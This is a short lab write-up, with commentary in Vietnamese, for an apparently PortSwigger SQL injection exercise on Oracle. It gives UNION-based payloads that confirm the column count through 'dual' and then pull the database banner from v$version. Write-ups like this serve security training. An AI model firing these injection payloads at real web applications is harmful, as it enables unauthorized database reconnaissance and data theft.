# Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

# Overview:

Lab này ta vẫn thực hiện UNION attack để lấy kết quả từ cuộc truy vấn. Nhưng lần này version là Oracale, nên payload sẽ khác một chút.Ta sẽ sử dụng [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Form lab

![image](https://user-images.githubusercontent.com/115911041/232260666-3178f2b8-becb-4f27-b3ba-ea6b30992bc4.png)

Yêu cầu là `Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'` nghĩa là ta phải làm cho database nhận ra chuỗi trên.

# Solution:

Bước đầu cần xác nhận số column, nhưng đây là oracle nên là nó sẽ khác payload thường

`'+UNION+SELECT+'a','b'+FROM+dual`

![image](https://user-images.githubusercontent.com/115911041/232260764-1dfe2d03-075b-403a-afe1-2bff66dbd777.png)

Sau khi xác nhận được số column, ta tìm payload thích hợp ở SQL injection cheat sheet.

![image](https://user-images.githubusercontent.com/115911041/232260793-4da8bfa6-4be1-4fd9-a9a0-1f9e696a37cd.png)

Đây là payload ta sẽ sử dụng

`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

![image](https://user-images.githubusercontent.com/115911041/232260855-c756b946-d040-4308-843d-98eb096526b4.png)





